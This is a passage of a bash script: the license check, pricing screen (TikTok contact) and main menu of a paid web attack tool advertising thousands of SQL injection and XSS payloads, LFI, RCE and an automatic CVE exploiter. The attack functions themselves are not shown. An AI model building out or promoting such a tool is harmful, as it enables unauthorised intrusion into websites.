        echo -e "${CYAN}║                    WELCOME MENU                          ║${NC}"
        echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  [1] 🔑 Aktivasi License                                 ║${NC}"
        echo -e "${CYAN}║  [2] 💳 Cara Beli                                        ║${NC}"
        echo -e "${CYAN}║  [3] ℹ️  Tentang Tools                                   ║${NC}"
        echo -e "${CYAN}║  [0] Keluar                                              ║${NC}"
        echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${KUNING}⚠️  ANDA BELUM AKTIVASI LICENSE!${NC}"
        echo ""
        echo -ne "${KUNING}Pilih menu [0-3]: ${NC}"
        read choice
        
        case $choice in
            1)
                if validate_license; then
                    main_menu
                fi
                ;;
            2)
                clear
                echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${CYAN}║              CARA BELI LICENSE                            ║${NC}"
                echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
                echo -e "${CYAN}║  📦 PAKET:                                                 ║${NC}"
                echo -e "${CYAN}║  • TRIAL 3 hari: GRATIS                                    ║${NC}"
                echo -e "${CYAN}║  • 1 Minggu: Rp 25.000                                     ║${NC}"
                echo -e "${CYAN}║  • 1 Bulan: Rp 50.000                                      ║${NC}"
                echo -e "${CYAN}║  • 3 Bulan: Rp 150.000                                     ║${NC}"
                echo -e "${CYAN}║  • PERMANEN: Rp 200.000                                    ║${NC}"
                echo -e "${CYAN}║                                                            ║${NC}"
                echo -e "${CYAN}║  DM TikTok @lugowo.hy untuk order                          ║${NC}"
                echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
                echo ""
                echo -ne "${KUNING}Press Enter...${NC}"
                read
                ;;
            3)
                echo ""
                echo -e "${CYAN}IMXploit Predator v$VERSION${NC}"
                echo -e "${CYAN}Created by: $OWNER${NC}"
                echo -e "${CYAN}📍 TikTok: $CONTACT_TIKTOK${NC}"
                echo -e "${CYAN}📍 Fitur: 13 ULTIMATE BRUTAL FEATURES${NC}"
                echo ""
                echo -ne "${KUNING}Press Enter...${NC}"
                read
                ;;
            0) exit 0 ;;
            *) echo -e "${MERAH}Pilihan tidak valid!${NC}"; sleep 1 ;;
        esac
    done
}

# ============== MAIN MENU ==============
main_menu() {
    while true; do
        clear
        echo -e "${MERAH}"
        echo "    ╔════════════════════════════════════════════════════════════╗"
        echo "    ║     IMXPLOIT-PREDATOR-X v28.0 - ULTIMATE BRUTAL            ║"
        echo "    ║              Created by: IMXploit                          ║"
        echo "    ║              Contact: @lugowo.hy (TikTok)                   ║"
        echo "    ╚════════════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        if [[ -f "$LICENSE_FILE" ]]; then
            expiry=$(cat "$LICENSE_FILE" | cut -d'|' -f2)
            days=$(( ( $(date -d "$expiry" +%s) - $(date +%s) ) / 86400 ))
            echo -e "${CYAN}══════════════════════════════════════════════════════════════${NC}"
            echo -e "${CYAN}  🔥 LICENSE AKTIF: ${HIJAU}$days hari lagi${NC}"
            echo -e "${CYAN}══════════════════════════════════════════════════════════════${NC}"
            echo ""
        fi
        
        echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║              🔥 ULTIMATE BRUTAL MENU 🔥                   ║${NC}"
        echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  [1]  💀 SQLi NUCLEAR (3000+ payload)                     ║${NC}"
        echo -e "${CYAN}║  [2]  🕷️ XSS APOCALYPSE (1500+ payload)                   ║${NC}"
        echo -e "${CYAN}║  [3]  📂 LFI NUCLEAR (300+ wrappers)                      ║${NC}"
        echo -e "${CYAN}║  [4]  💻 RCE MASTER (300+ commands)                       ║${NC}"
        echo -e "${CYAN}║  [5]  🔀 Open Redirect + SSRF                             ║${NC}"
        echo -e "${CYAN}║  [6]  🌐 Subdomain Enum + Port Scan                       ║${NC}"
        echo -e "${CYAN}║  [7]  📁 Directory Bruteforce (400+ wordlist)             ║${NC}"
        echo -e "${CYAN}║  [8]  🛡️ Auto CVE Exploiter                               ║${NC}"
        echo -e "${CYAN}║  [9]  💾 Backup File Finder                               ║${NC}"
        echo -e "${CYAN}║  [10] 🔍 Parameter Discovery                              ║${NC}"
        echo -e "${CYAN}║  [11] 🔧 Technology Detector                              ║${NC}"
        echo -e "${CYAN}║  [12] 💔 Heartbleed Checker                               ║${NC}"
        echo -e "${CYAN}║  [13] 📄 Generate Ultimate Report                         ║${NC}"
        echo -e "${CYAN}║  [0]  Keluar                                              ║${NC}"
        echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -ne "${KUNING}Pilih menu [0-13]: ${NC}"
        read choice
        
        case $choice in
            1) sqli_nuclear ;;
            2) xss_apocalypse ;;
            3) lfi_nuclear ;;
            4) rce_master ;;
            5) redirect_ssrf ;;
            6) subdomain_enum ;;
            7) dir_bruteforce ;;
            8) cve_exploiter ;;
            9) backup_finder ;;
            10) param_discovery ;;
            11) tech_detector ;;
            12) heartbleed_check ;;
            13) ultimate_report ;;
            0) exit 0 ;;
            *) echo -e "${MERAH}Pilihan tidak valid!${NC}"; sleep 1 ;;
        esac
    done
}

# ============== MAIN ==============
main() {
    clear
    echo -e "${MERAH}"
    echo "    ╔════════════════════════════════════════════════════════════╗"
    echo "    ║     IMXPLOIT-PREDATOR-X v28.0 - ULTIMATE BRUTAL            ║"
    echo "    ║              Created by: IMXploit                          ║"
    echo "    ║              Contact: @lugowo.hy (TikTok)                   ║"
    echo "    ╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    sleep 2
    
    if check_license; then
        main_menu
    else
        welcome_menu
    fi
}

main